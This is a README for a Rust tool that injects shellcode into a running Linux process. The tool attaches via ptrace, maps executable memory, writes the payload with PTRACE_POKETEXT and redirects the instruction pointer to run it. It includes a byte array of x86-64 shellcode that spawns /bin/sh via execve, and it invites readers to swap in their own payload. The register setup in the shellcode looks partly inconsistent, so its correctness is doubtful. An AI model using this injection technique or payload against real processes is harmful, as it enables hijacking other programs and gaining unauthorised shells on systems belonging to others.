# Ptrace Shellcode Injection Example

This Rust project demonstrates how to inject shellcode into a target process using `ptrace` to allocate memory, write shellcode, and execute it by modifying the target process's registers.

## Features

- Attach to a target process using `ptrace`. (By default this is the `sleep`` command. Modify the process_name variable to target a different process.)
- Allocate executable memory in the target process using the `mmap` system call.
- Write shellcode into the allocated memory using `PTRACE_POKETEXT`.
- Modify the instruction pointer (`RIP`) to execute the injected shellcode.
- Cleanly detach from the target process after injection.

## Prerequisites

- Rust (latest stable version recommended)
- Root privileges to execute the program (or adjust `ptrace_scope` settings).

## Shellcode Example

The example includes shellcode to execute `/bin/sh` using the `execve` system call. Modify the shellcode as needed for your use case.

```rust
let shellcode: [u8; 32] = [
    0x48, 0x31, 0xff,                         // xor    rdi, rdi
    0x48, 0x89, 0xe6,                         // mov    rsi, rsp
    0x48, 0x8d, 0x3d, 0x0a, 0x00, 0x00, 0x00, // lea    rdi, [rip+10]
    0x31, 0xc0,                               // xor    eax, eax
    0x48, 0xc7, 0xc0, 0x3b, 0x00, 0x00, 0x00, // mov    rax, 59 (execve)
    0x0f, 0x05,                               // syscall
    0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00  // "/bin/sh"
];
```